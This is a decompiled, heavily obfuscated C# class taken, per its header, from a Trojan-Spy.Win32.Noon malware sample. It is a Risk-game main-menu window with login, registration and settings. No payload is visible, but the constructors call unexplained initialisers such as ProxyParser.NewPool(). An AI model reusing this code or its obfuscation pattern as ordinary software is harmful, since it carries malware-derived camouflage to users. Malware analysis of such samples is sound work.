// Decompiled with JetBrains decompiler
// Type: RiskGame.Shared.Bridge
// Assembly: ArrayWithOff, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C12E9A27-BEBF-4775-817A-6AC642D52B19
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.Noon.bcra-344266b0bd586b6b9907f1657c694060dd1bae1df9fda81d7433002d419fe4fa.exe

using ArrayWithOff.Annotations;
using ArrayWithOff.Collections;
using ArrayWithOff.Database;
using ArrayWithOff.Dictionaries;
using RiskGame.Dispatcher;
using RiskGame.Maps;
using RiskGame.Producers;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Markup;

namespace RiskGame.Shared
{
  public class Bridge : Window, IComponentConnector, IStyleConnector
  {
    private List<Player> _Connection;
    private Human m_Facade;
    private bool m_Composer;
    private bool m_Identifier;
    internal StackPanel panel_MainUI;
    internal TextBox txtRegName;
    internal PasswordBox txtRegPass;
    internal TextBox txtRegPassShow;
    internal Button btnRegPassToggle;
    internal CheckBox chkRegPass;
    internal PasswordBox txtRegPassConf;
    internal TextBox txtRegPassConfShow;
    internal CheckBox chkRegPassConf;
    internal TextBox txtLogName;
    internal PasswordBox txtLogPass;
    internal TextBox txtLogPassShow;
    internal CheckBox chkLogPass;
    internal Label lblError;
    internal TextBlock txtError;
    internal Label lblSuccess;
    internal TextBlock txtSuccess;
    internal DockPanel panel_Settings;
    internal Label lblMediaDetails;
    internal MediaElement mediaplayer;
    internal Slider slider_Volume;
    internal CheckBox chkMusicEnabled;
    internal CheckBox chkFullscreen;
    internal CheckBox chkHints;
    private bool m_Tag;

    public bool Music_enabled
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this.m_Composer;
      [MethodImpl(MethodImplOptions.NoInlining)] set
      {
        int num1 = 4;
        while (true)
        {
          int num2 = num1;
          bool flag;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 4:
                goto label_18;
              case 1:
              case 3:
                if (flag)
                {
                  try
                  {
                    ((Human) this._Connection[0]).m_Publisher = value;
                    int num3 = 2;
                    if (Bridge.FillContainer())
                      ;
                    while (true)
                    {
                      switch (num3)
                      {
                        case 0:
                        case 2:
                          goto label_3;
                        case 1:
                        case 3:
                          goto label_7;
                        default:
                          num3 = 3;
                          continue;
                      }
                    }
label_3:
                    Human.QuerySerializer(this._Connection[0] as Human);
                  }
                  catch
                  {
                    this.GetExpression("An error has occurred. Your music preferences have not been saved.");
                  }
label_7:;
                }
                if (value)
                {
                  num2 = 5;
                  continue;
                }
                goto label_11;
              case 2:
                goto label_17;
              case 5:
                goto label_10;
              case 6:
                goto label_16;
              case 7:
                goto label_12;
              default:
                goto label_15;
            }
          }
label_10:
          this.mediaplayer.Play();
          goto label_17;
label_11:
          if (value)
            goto label_17;
          else
            goto label_16;
label_15:
          num1 = 6;
          continue;
label_16:
          this.mediaplayer.Pause();
          num1 = 2;
          continue;
label_17:
          this.m_Composer = value;
          num1 = 7;
          continue;
label_18:
          flag = this._Connection.Count != 0;
          num1 = 3;
        }
label_12:;
      }
    }

    public bool Hints_enabled
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this.m_Identifier;
      [MethodImpl(MethodImplOptions.NoInlining)] set
      {
        int num1 = 4;
        while (true)
        {
          bool flag;
          switch (num1)
          {
            case 0:
            case 4:
              flag = this._Connection.Count != 0;
              num1 = 3;
              continue;
            case 1:
            case 3:
              if (!flag)
                break;
              goto case 2;
            case 2:
              try
              {
                ((Human) this._Connection[0]).policy = value;
                int num2 = 2;
                while (true)
                {
                  switch (num2)
                  {
                    case 0:
                    case 2:
                      goto label_3;
                    case 1:
                    case 3:
                      goto label_7;
                    default:
                      num2 = 3;
                      continue;
                  }
                }
label_3:
                Human.QuerySerializer(this._Connection[0] as Human);
              }
              catch
              {
                this.GetExpression("An error has occurred. Your music preferences have not been saved.");
              }
label_7:
              break;
            case 5:
              goto label_10;
            default:
              num1 = 2;
              continue;
          }
          this.m_Identifier = value;
          num1 = 5;
        }
label_10:;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Bridge(bool setident, bool requirespol, bool forcecontrol)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            ProxyParser.NewPool();
            int num2 = 3;
            num1 = Bridge.FillContainer() ? num2 : num2;
            continue;
          case 2:
          case 4:
            this._Connection = new List<Player>();
            this.CompareExpression(setident, requirespol, forcecontrol);
            num1 = 5;
            continue;
          case 3:
            // ISSUE: explicit constructor call
            base.\u002Ector();
            goto case 2;
          case 5:
            goto label_2;
          default:
            if (true)
            {
              num1 = 4;
              continue;
            }
            goto case 2;
        }
      }
label_2:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Bridge(List<Player> last, bool validateord)
    {
      ProxyParser.NewPool();
      // ISSUE: explicit constructor call
      base.\u002Ector();
      this._Connection = last;
      this.CompareExpression(((Human) this._Connection[0]).m_Publisher, ((Human) this._Connection[0]).policy, validateord);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CompareExpression(bool movelast, bool ispred, bool isconsumer)
    {
      int num1 = 2;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              goto label_1;
            case 1:
              AuthenticationContainerProducer.InitModel();
              this.StateChanged += new EventHandler(((ParamsPropertyCollection) Application.Current).CloneSerializer);
              this.DataContext = (object) this;
              this.Music_enabled = movelast;
              this.Hints_enabled = ispred;
              if (this.m_Composer)
              {
                if (Bridge.TestContainer())
                {
                  num2 = 5;
                  continue;
                }
                goto label_12;
              }
              else
                goto label_5;
            case 2:
              goto label_3;
            case 4:
            case 6:
              goto label_2;
            case 5:
              goto label_4;
            case 7:
              goto label_12;
            default:
              goto label_9;
          }
        }
label_1:
        ((ParamsPropertyCollection) Application.Current).GetSerializer((Window) this);
        num1 = 6;
        continue;
label_2:
        ((ParamsPropertyCollection) Application.Current).CalcSerializer((Window) this);
        num1 = 7;
        continue;
label_3:
        this.InitializeComponent();
        num1 = 1;
        continue;
label_4:
        this.mediaplayer.Play();
label_5:
        if (!isconsumer)
          break;
        goto label_1;
label_9:
        num1 = 0;
      }
      return;
label_12:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void GetExpression(string first)
    {
      this.txtError.Text = first;
      this.lblError.Visibility = Visibility.Visible;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void OrderExpression(string ident)
    {
      this.txtSuccess.Text = ident;
      this.lblSuccess.Visibility = Visibility.Visible;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void Login(object sender, RoutedEventArgs e)
    {
      try
      {
        this.lblError.Visibility = Visibility.Collapsed;
        this.m_Facade = Human.FlushSerializer(this.txtLogName.Text, this.txtLogPass.Password);
        if (this._Connection.Contains((Player) this.m_Facade))
        {
          this.GetExpression("This player is already signed in");
        }
        else
        {
          this._Connection.Add((Player) this.m_Facade);
          ConsumerHelperMap consumerHelperMap = new ConsumerHelperMap(this._Connection, ((ParamsPropertyCollection) Application.Current).NewSerializer((Window) this));
          Application.Current.MainWindow = (Window) consumerHelperMap;
          this.Close();
          consumerHelperMap.Show();
        }
      }
      catch (ArgumentNullException ex)
      {
        this.GetExpression("Please enter a username and password.");
      }
      catch (ModelParser ex)
      {
        this.GetExpression(ex.Message);
      }
      catch (WrapperModelDispatcher ex)
      {
        this.GetExpression(ex.Message);
      }
      catch (IOException ex)
      {
        this.GetExpression("An error reading or writing from the file has occurred. Please ensure you have registered an account or delete the Usersaves.txt file in the game directory.");
      }
      catch (Exception ex)
      {
        this.GetExpression("An unknown error has occurred.");
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void Register(object sender, RoutedEventArgs e)
    {
      try
      {
        this.lblError.Visibility = Visibility.Collapsed;
        this.lblSuccess.Visibility = Visibility.Collapsed;
        if (this.txtRegName.Text == null || this.txtRegPass.Password == null || this.txtRegPassConf.Password == null || this.txtRegName.Text == "" || this.txtRegPass.Password == "" || this.txtRegPassConf.Password == "")
          throw new ArgumentNullException();
        if (this.txtRegPass.Password == this.txtRegPassConf.Password)
        {
          Human.Register(this.txtRegName.Text, this.txtRegPass.Password, this.m_Composer, this.m_Identifier);
          this.OrderExpression("Registration successful. Click login to continue.");
          this.txtLogName.Text = this.txtRegName.Text;
          this.txtLogPass.Password = this.txtRegPass.Password;
          this.Login(sender, e);
        }
        else
          this.GetExpression("Passwords do not match");
      }
      catch (ListenerServerAnnotation ex)
      {
        this.GetExpression(ex.expressionParser);
      }
      catch (IOException ex)
      {
        this.GetExpression("An error reading or writing from the file has occurred. Please try again or delete the Usersaves.txt file in the game directory.");
      }
      catch (ArgumentNullException ex)
      {
        this.GetExpression("Please provide an input for every field.");
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void NewExpression(object info, KeyEventArgs token)
    {
      int num1 = 1;
      if (Bridge.TestContainer())
        goto label_4;
label_1:
      bool flag;
      if (!flag)
        return;
      goto label_7;
label_3:
      int num2;
      num1 = num2;
label_4:
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            goto label_6;
          case 2:
          case 3:
            goto label_7;
          case 4:
            goto label_1;
          case 5:
            goto label_8;
          default:
            if (Bridge.TestContainer())
            {
              num1 = 3;
              continue;
            }
            goto label_6;
        }
      }
label_6:
      flag = token.Key == Key.Return;
      num2 = 4;
      goto label_3;
label_8:
      return;
label_7:
      this.Register(info, (RoutedEventArgs) token);
      num2 = 5;
      goto label_3;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void InitExpression(object v, KeyEventArgs result)
    {
      int num = 4;
      bool flag;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            this.Login(v, (RoutedEventArgs) result);
            num = 5;
            continue;
          case 1:
          case 3:
            if (!flag)
              goto label_4;
            else
              goto case 0;
          case 4:
            flag = result.Key == Key.Return;
            num = 3;
            continue;
          case 5:
            goto label_7;
          default:
            num = 0;
            continue;
        }
      }
label_4:
      return;
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void MoveExpression(object instance, RoutedEventArgs cont)
    {
      int num1 = 7;
      TextBox textBox;
      while (true)
      {
        int num2 = num1;
        CheckBox checkBox;
        string name;
        PasswordBox passwordBox;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 7:
              goto label_1;
            case 1:
            case 6:
              passwordBox = new PasswordBox();
              if (true)
              {
                num2 = 4;
                continue;
              }
              goto case 4;
            case 2:
              goto label_2;
            case 3:
              goto label_18;
            case 4:
              textBox = new TextBox();
              name = checkBox.Name;
              if (!(name == "chkRegPass"))
              {
                if (name == "chkRegPassConf")
                {
                  passwordBox = this.txtRegPassConf;
                  if (!Bridge.FillContainer())
                  {
                    num2 = 5;
                    continue;
                  }
                  goto case 1;
                }
                else
                  goto label_9;
              }
              else
                goto label_4;
            case 5:
              goto label_12;
            case 8:
              goto label_10;
            case 9:
              goto label_3;
            case 10:
              goto label_20;
            default:
              if (Bridge.TestContainer())
              {
                num2 = 2;
                continue;
              }
              goto label_18;
          }
        }
label_1:
        checkBox = (CheckBox) instance;
        num1 = 6;
        continue;
label_2:
        bool flag = true;
        num1 = 3;
        continue;
label_3:
        if (name == "chkLogPass")
        {
          passwordBox = this.txtLogPass;
          textBox = this.txtLogPassShow;
          goto label_14;
        }
        else
          goto label_14;
label_4:
        passwordBox = this.txtRegPass;
        textBox = this.txtRegPassShow;
        goto label_14;
label_9:
        num1 = 9;
        continue;
label_12:
        textBox = this.txtRegPassConfShow;
label_14:
        bool? isChecked = checkBox.IsChecked;
        goto label_2;
label_18:
        if (!(isChecked.GetValueOrDefault() == flag & isChecked.HasValue))
        {
          passwordBox.Password = textBox.Text;
          passwordBox.Visibility = Visibility.Visible;
          textBox.Visibility = Visibility.Collapsed;
          num1 = 10;
        }
        else
        {
          textBox.Text = passwordBox.Password;
          passwordBox.Visibility = Visibility.Collapsed;
          num1 = 8;
        }
      }
label_10:
      textBox.Visibility = Visibility.Visible;
      return;
label_20:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void Leaderboard(object sender, RoutedEventArgs e)
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
              goto label_1;
            case 1:
            case 2:
              if (this._Connection.Count > 0)
              {
                if (true)
                {
                  num2 = 3;
                  continue;
                }
                goto label_9;
              }
              else
                goto label_3;
            case 3:
              goto label_2;
            case 5:
              goto label_9;
            case 6:
              goto label_10;
            default:
              goto label_6;
          }
        }
label_1:
        RiskGame.Visitors.Decorator decorator = new RiskGame.Visitors.Decorator(this.Music_enabled, this.Hints_enabled, ((ParamsPropertyCollection) Application.Current).NewSerializer((Window) this));
        num1 = 2;
        continue;
label_2:
        decorator = new RiskGame.Visitors.Decorator(this._Connection, ((ParamsPropertyCollection) Application.Current).NewSerializer((Window) this));
label_3:
        Application.Current.MainWindow = (Window) decorator;
        goto label_9;
label_6:
        num1 = 5;
        continue;
label_9:
        this.Close();
        decorator.Show();
        num1 = 6;
      }
label_10:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ReflectExpression(object info, RoutedEventArgs caller)
    {
      int num1 = 5;
      while (true)
      {
        int num2 = num1;
        IEnumerator enumerator;
        bool flag1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_18;
            case 1:
            case 4:
              enumerator = Application.Current.Windows.GetEnumerator();
              num2 = 6;
              continue;
            case 2:
            case 6:
              goto label_2;
            case 3:
              goto label_23;
            case 5:
              flag1 = false;
              num2 = 4;
              continue;
            case 7:
              goto label_24;
            default:
              if (true)
              {
                num2 = 0;
                continue;
              }
              goto case 5;
          }
        }
label_2:
        try
        {
label_9:
          while (enumerator.MoveNext())
          {
            Window current = (Window) enumerator.Current;
            int num3 = 3;
            while (true)
            {
              int num4 = num3;
              while (true)
              {
                switch (num4)
                {
                  case 0:
                  case 3:
                    if (!(current is ProducerServerAnnotation))
                      goto label_9;
                    else
                      goto case 1;
                  case 1:
                  case 2:
                    flag1 = true;
                    if (true)
                    {
                      num4 = 4;
                      continue;
                    }
                    goto case 0;
                  case 4:
                    goto label_13;
                  default:
                    goto label_8;
                }
              }
label_8:
              num3 = 2;
            }
          }
        }
        finally
        {
          if (enumerator is IDisposable disposable)
            disposable.Dispose();
        }
label_13:
        bool flag2 = !flag1;
label_18:
        ProducerServerAnnotation serverAnnotation;
        if (flag2)
        {
          if (this.txtLogName.Text != null)
          {
            serverAnnotation = new ProducerServerAnnotation(this.txtLogName.Text);
            num1 = 3;
            continue;
          }
          serverAnnotation = new ProducerServerAnnotation();
        }
        else
          break;
label_23:
        serverAnnotation.Show();
        num1 = 7;
      }
      return;
label_24:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ManageExpression(object last, CancelEventArgs token)
    {
      foreach (Window window in Application.Current.Windows)
      {
        int num = 2;
        bool flag;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 2:
              flag = window is ProducerServerAnnotation;
              goto case 1;
            case 1:
            case 3:
              if (flag)
              {
                window.Close();
                num = 4;
                continue;
              }
              goto label_8;
            case 4:
              goto label_8;
            default:
              num = 3;
              continue;
          }
        }
label_8:;
      }
    }

    [DebuggerNonUserCode]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void InitializeComponent()
    {
      int num = 0;
      if (true)
        goto label_4;
label_1:
      Uri resourceLocator;
      Application.LoadComponent((object) this, resourceLocator);
      if (!Bridge.TestContainer())
        return;
      num = 6;
label_4:
      bool tag;
      while (true)
      {
        switch (num)
        {
          case 0:
            tag = this.m_Tag;
            num = 5;
            continue;
          case 1:
            goto label_10;
          case 2:
            goto label_11;
          case 3:
          case 4:
            goto label_1;
          case 5:
            if (tag)
            {
              num = 1;
              continue;
            }
            goto label_3;
          case 6:
            goto label_9;
          default:
            num = 4;
            continue;
        }
      }
label_3:
      this.m_Tag = true;
      resourceLocator = new Uri("/ArrayWithOff;component/mainmenu.xaml", UriKind.Relative);
      goto label_1;
label_10:
      return;
label_11:
      return;
label_9:;
    }

    [EditorBrowsable(EditorBrowsableState.Never)]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.NoInlining)]
    void IComponentConnector.Connect(int sum_init, object connection)
    {
      int num1 = 5;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
label_38:
            this.m_Tag = true;
            if (Bridge.TestContainer())
            {
              num1 = 14;
              continue;
            }
            goto case 12;
          case 1:
            goto label_34;
          case 2:
            goto label_41;
          case 3:
            goto label_42;
          case 4:
            goto label_43;
          case 5:
            num3 = sum_init;
            num2 = 9;
            break;
          case 6:
            goto label_44;
          case 7:
            goto label_45;
          case 8:
            goto label_46;
          case 9:
            switch (num3)
            {
              case 1:
                goto label_10;
              case 2:
                goto label_11;
              case 3:
              case 13:
                goto label_38;
              case 4:
                this.txtRegName = (TextBox) connection;
                this.txtRegName.KeyDown += new KeyEventHandler(this.NewExpression);
                num1 = 8;
                continue;
              case 5:
                goto label_25;
              case 6:
                this.txtRegPassShow = (TextBox) connection;
                this.txtRegPassShow.KeyDown += new KeyEventHandler(this.NewExpression);
                num2 = 13;
                break;
              case 7:
                goto label_7;
              case 8:
                goto label_8;
              case 9:
                this.txtRegPassConf = (PasswordBox) connection;
                if (true)
                {
                  num1 = 12;
                  continue;
                }
                goto label_38;
              case 10:
                goto label_3;
              case 11:
                goto label_13;
              case 12:
                goto label_14;
              case 14:
                goto label_15;
              case 15:
                goto label_16;
              case 16:
                goto label_17;
              case 17:
                goto label_18;
              case 18:
                ((ButtonBase) connection).Click += new RoutedEventHandler(this.Login);
                num1 = 2;
                continue;
              case 19:
                goto label_28;
              case 20:
                goto label_29;
              case 21:
                goto label_30;
              case 22:
                goto label_31;
              case 23:
                goto label_32;
              case 24:
                this.txtSuccess = (TextBlock) connection;
                int num4 = 4;
                num1 = Bridge.FillContainer() ? num4 : num4;
                continue;
              case 25:
                goto label_20;
              case 26:
                goto label_21;
              case 27:
                goto label_22;
              case 28:
                this.slider_Volume = (Slider) connection;
                if (true)
                {
                  num1 = 7;
                  continue;
                }
                goto label_24;
              case 29:
                goto label_1;
              case 30:
                this.chkFullscreen = (CheckBox) connection;
                num1 = 11;
                continue;
              case 31:
                goto label_37;
              default:
                num1 = 0;
                continue;
            }
            break;
          case 10:
            goto label_47;
          case 11:
            goto label_48;
          case 12:
            this.txtRegPassConf.KeyDown += new KeyEventHandler(this.NewExpression);
            num2 = 1;
            break;
          case 13:
            goto label_49;
          case 14:
            goto label_50;
          default:
            num1 = 6;
            continue;
        }
        num1 = num2;
      }
label_1:
      this.chkMusicEnabled = (CheckBox) connection;
      return;
label_3:
      this.txtRegPassConfShow = (TextBox) connection;
      this.txtRegPassConfShow.KeyDown += new KeyEventHandler(this.NewExpression);
      return;
label_50:
      return;
label_49:
      return;
label_48:
      return;
label_47:
      return;
label_34:
      return;
label_45:
      return;
label_44:
      return;
label_43:
      return;
label_42:
      return;
label_41:
      return;
label_46:
      return;
label_7:
      this.btnRegPassToggle = (Button) connection;
      return;
label_8:
      this.chkRegPass = (CheckBox) connection;
      this.chkRegPass.Click += new RoutedEventHandler(this.MoveExpression);
      return;
label_10:
      ((Window) connection).Closing += new CancelEventHandler(this.ManageExpression);
      return;
label_11:
      this.panel_MainUI = (StackPanel) connection;
      return;
label_13:
      this.chkRegPassConf = (CheckBox) connection;
      this.chkRegPassConf.Click += new RoutedEventHandler(this.MoveExpression);
      return;
label_14:
      ((ButtonBase) connection).Click += new RoutedEventHandler(this.Register);
      return;
label_15:
      this.txtLogName = (TextBox) connection;
      this.txtLogName.KeyDown += new KeyEventHandler(this.InitExpression);
      return;
label_16:
      this.txtLogPass = (PasswordBox) connection;
      this.txtLogPass.KeyDown += new KeyEventHandler(this.InitExpression);
      return;
label_17:
      this.txtLogPassShow = (TextBox) connection;
      this.txtLogPassShow.KeyDown += new KeyEventHandler(this.InitExpression);
      return;
label_18:
      this.chkLogPass = (CheckBox) connection;
      this.chkLogPass.Click += new RoutedEventHandler(this.MoveExpression);
      return;
label_20:
      this.panel_Settings = (DockPanel) connection;
      return;
label_21:
      this.lblMediaDetails = (Label) connection;
      return;
label_22:
      this.mediaplayer = (MediaElement) connection;
      return;
label_24:
      return;
label_25:
      this.txtRegPass = (PasswordBox) connection;
      this.txtRegPass.KeyDown += new KeyEventHandler(this.NewExpression);
      return;
label_28:
      ((ButtonBase) connection).Click += new RoutedEventHandler(this.ReflectExpression);
      return;
label_29:
      ((ButtonBase) connection).Click += new RoutedEventHandler(this.Leaderboard);
      return;
label_30:
      this.lblError = (Label) connection;
      return;
label_31:
      this.txtError = (TextBlock) connection;
      return;
label_32:
      this.lblSuccess = (Label) connection;
      return;
label_37:
      this.chkHints = (CheckBox) connection;
    }

    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [EditorBrowsable(EditorBrowsableState.Never)]
    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.NoInlining)]
    void IStyleConnector.Connect(int param_counter, object visitor)
    {
      int num1 = 6;
      if (true)
        goto label_12;
label_1:
      int num2;
      int num3 = num2;
      EventSetter eventSetter;
      if (num3 != 3)
      {
        num1 = 1;
        goto label_12;
      }
      else
      {
        eventSetter = new EventSetter();
        eventSetter.Event = UIElement.KeyDownEvent;
        eventSetter.Handler = (Delegate) new KeyEventHandler(this.NewExpression);
      }
label_5:
      ((Style) visitor).Setters.Add((SetterBase) eventSetter);
      return;
label_12:
      while (true)
      {
        int num4;
        switch (num1)
        {
          case 0:
            goto label_5;
          case 1:
          case 2:
            goto label_8;
          case 3:
          case 4:
            eventSetter.Event = UIElement.KeyDownEvent;
            eventSetter.Handler = (Delegate) new KeyEventHandler(this.InitExpression);
            ((Style) visitor).Setters.Add((SetterBase) eventSetter);
            if (true)
            {
              num1 = 7;
              continue;
            }
            goto case 6;
          case 5:
            goto label_1;
          case 6:
            num2 = param_counter;
            num4 = 5;
            break;
          case 7:
            goto label_7;
          default:
            num4 = 0;
            break;
        }
        num1 = num4;
      }
label_8:
      while (num3 == 13)
      {
        eventSetter = new EventSetter();
        if (true)
        {
          num1 = 3;
          goto label_12;
        }
      }
      return;
label_7:;
    }

    internal static bool TestContainer() => true;

    internal static bool FillContainer() => false;
  }
}
